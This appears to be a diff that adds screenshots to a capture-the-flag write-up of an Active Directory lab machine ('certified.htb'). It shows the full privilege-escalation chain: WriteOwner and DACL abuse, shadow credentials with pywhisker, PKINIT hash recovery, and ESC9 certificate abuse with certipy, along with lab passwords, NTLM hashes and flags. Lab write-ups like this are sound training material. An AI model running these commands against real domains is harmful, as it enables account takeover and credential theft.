@@ -140,7 +140,11 @@ sudo neo4j console
 bloodhound
 ```
 
+![BloodHound collection run against the domain](./images/bloodhound_enum.png)
+
 With `judith.mader` marked as owned and set as the starting node, the **Node Info → Reachable High Value Targets** view revealed a path consisting of a `WriteOwner` edge to the `management` group, a `GenericWrite` edge from that group to the `management_svc` account, and a `CanPSRemote` edge from `management_svc` to `dc01.certified.htb`.
+
+![WriteOwner, GenericWrite, and CanPSRemote path from judith.mader to the domain controller](./images/judith_perms.png)
 
 **Findings:** `judith.mader` held `WriteOwner` over the `management` group, and members of `management` held `GenericWrite` over `management_svc`, which itself had WinRM (`CanPSRemote`) access to the domain controller — a clear privilege escalation path from a single low-privileged credential.
 
@@ -150,6 +154,8 @@ With `judith.mader` marked as owned and set as the starting node, the **Node Inf
 bloodyad --host "10.129.231.186" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader
 ```
 
+![Group owner successfully changed to judith.mader](./images/setting_owner.png)
+
 **Findings:** `judith.mader`'s `WriteOwner` right over the `management` group was abused to change the group's owner to `judith.mader` herself, granting full downstream control over the group's DACL.
 
 ### 1.4. Exploitation — Granting Full Control and Joining the Management Group
@@ -157,6 +163,8 @@ bloodyad --host "10.129.231.186" -d "certified.htb" -u "judith.mader" -p "judith
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
 ```
+
+![DACL successfully modified, with a backup of the original saved](./images/dacl_backup.png)
 
 **Findings:** As the new owner, `judith.mader` granted herself `FullControl` over the `management` group's DACL via `dacledit.py`, with the prior DACL automatically backed up before modification.
 
@@ -172,11 +180,15 @@ net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.made
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --use-ldaps
 ```
 
+![Shadow Credential added to management_svc via pywhisker, PFX certificate generated](./images/ldaps_exploit.png)
+
 **Findings:** `pywhisker` abused the inherited `GenericWrite` right to add a "Shadow Credential" (a certificate-based key credential) to `management_svc`'s `msDS-KeyCredentialLink` attribute, producing a PFX certificate/key pair that could authenticate as `management_svc` without knowing its password.
 
 ```bash
 python3 gettgtpkinit.py -cert-pfx ~/pywhisker/pywhisker/YrYIu2Cf.pfx certified.htb/management_svc -pfx-pass 'kNthXx9kqDqmupUecqQm' management_svc.ccache
 ```
+
+![TGT successfully requested for management_svc via PKINIT](./images/tgt.png)
 
 **Findings:** The certificate was used with PKINIT to request a valid Kerberos TGT for `management_svc`, saved to a credential cache file.
 
@@ -184,6 +196,8 @@ python3 gettgtpkinit.py -cert-pfx ~/pywhisker/pywhisker/YrYIu2Cf.pfx certified.h
 export KRB5CCNAME=management_svc.ccache
 python3 getnthash.py -key edf1ee051a0edd6a330354600414eae194e811008581b6c819d6646a4b1d632a certified.htb/management_svc
 ```
+
+![NTLM hash for management_svc recovered via U2U](./images/nt_hash.png)
 
 **Recovered NTLM hash:** `a091c1832bcdd4677c28b5a6a1295584`
 
@@ -198,11 +212,15 @@ ls
 cat user.txt
 ```
 
+![WinRM shell as management_svc with user.txt captured](./images/user_flag.png)
+
 **User flag:** `c777073085e674878190221ed63df8f7`
 
 ### 1.7. Lateral Movement — GenericAll Over ca_operator (Finding #4)
 
 Using BloodHound's Pathfinder from `management_svc`, a `GenericAll` edge was identified to a `ca_operator` account — a name suggestive of Certificate Authority operator privileges.
+
+![GenericAll edge from management_svc to ca_operator](./images/genricall_ca_operator.png)
 
 **Findings:** `management_svc` held `GenericAll` — full object control — over `ca_operator`, again enabling the Shadow Credentials technique, this time authenticated as `management_svc` via its NTLM hash rather than a plaintext password.
 
@@ -210,14 +228,20 @@ Using BloodHound's Pathfinder from `management_svc`, a `GenericAll` edge was ide
 python pywhisker.py -d "certified.htb" -u "management_svc" -H 'a091c1832bcdd4677c28b5a6a1295584' --target "ca_operator" --action "add"
 ```
 
+![Shadow Credential added to ca_operator via pywhisker, PFX certificate generated](./images/pfx_gen.png)
+
 ```bash
 python3 gettgtpkinit.py -cert-pfx ~/lJTgEkSK.pfx certified.htb/ca_operator -pfx-pass 'opeLmH9izVcMlodRxqgE' ca_operator.ccache
 ```
+
+![TGT successfully requested for ca_operator via PKINIT](./images/tgt2.png)
 
 ```bash
 export KRB5CCNAME=ca_operator.ccache
 python3 getnthash.py -key 3daf82a78183678e915a113c6f7ae242ed446862a8d3097c663e59d787c5783e certified.htb/ca_operator
 ```
+
+![NTLM hash for ca_operator recovered via U2U](./images/nt_hash2.png)
 
 **Recovered NTLM hash:** `b4b86f45c6018f1b664f70805f45d8f2`
 
@@ -229,11 +253,15 @@ python3 getnthash.py -key 3daf82a78183678e915a113c6f7ae242ed446862a8d3097c663e59
 nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M adcs
 ```
 
+![netexec adcs module confirming the PKI Enrollment Server and management_svc's hash](./images/credentials_found.png)
+
 **Findings:** The `adcs` module confirmed a PKI Enrollment Server (`certified-DC01-CA`) was present on the domain controller, consistent with the AD CS ports observed during the initial nmap scan.
 
 ```bash
 certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
 ```
+
+![Certipy flagging the CertifiedAuthentication template as vulnerable to ESC9](./images/vulns.png)
 
 **Findings:** Certipy's vulnerability scan flagged the certificate template used by `certified-DC01-CA` as vulnerable to **ESC9** — the CA's issuing policy does not enforce the `szOID_NTDS_CA_SECURITY_EXT` security extension on a template with `CT_FLAG_NO_SECURITY_EXTENSION` set, meaning a certificate's mapped identity is derived purely from the requesting account's UPN at the time of enrollment, with no binding to the account's actual SID. Certipy noted that additional prerequisites (e.g. `GenericWrite` over the target account to modify its UPN) may be required — a prerequisite already satisfied via `management_svc`'s `GenericAll` over `ca_operator`.
 
@@ -243,17 +271,23 @@ certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8
 certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
 ```
 
+![ca_operator's UPN successfully changed to Administrator](./images/failed_dns.png)
+
 **Findings:** Using `management_svc`'s `GenericAll` (and thus `GenericWrite`) rights over `ca_operator`, the `ca_operator` account's `userPrincipalName` attribute was changed from `ca_operator@certified.htb` to `Administrator`.
 
 ```bash
 certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -debug
 ```
 
+![Certificate successfully requested and issued with UPN 'Administrator'](./images/admin_pfx.png)
+
 **Findings:** A certificate was requested using `ca_operator`'s own credentials against the vulnerable `CertifiedAuthentication` template. Because the template lacks the security extension, the certificate was issued with a Subject Alternative Name UPN of `Administrator` rather than being bound to `ca_operator`'s actual SID — a certificate that, on authentication, is treated as belonging to the `Administrator` account.
 
 ```bash
 certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
 ```
+
+![ca_operator's UPN reverted back to its original value](./images/exploit_ca_operator.png)
 
 **Findings:** The `ca_operator` account's UPN was reverted to its original value immediately after the certificate was issued, minimizing footprint and avoiding breaking the account's normal logon behavior.
 
@@ -262,6 +296,8 @@ certipy-ad account update -username management_svc@certified.htb -hashes a091c18
 ```bash
 certipy-ad auth -pfx 'administrator.pfx' -domain 'certified.htb' -dc-ip 10.129.231.186 -debug
 ```
+
+![Certipy authenticating via PKINIT and retrieving the Administrator NTLM hash](./images/admin_hash.png)
 
 **Recovered hash:** `Administrator:aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34`
 
@@ -274,6 +310,8 @@ cd Desktop
 ls
 cat root.txt
 ```
+
+![WinRM shell as Administrator with root.txt captured](./images/root_flag.png)
 
 **Root flag:** `a18b8e34091b726aa857bbd15fdce5ee`
 
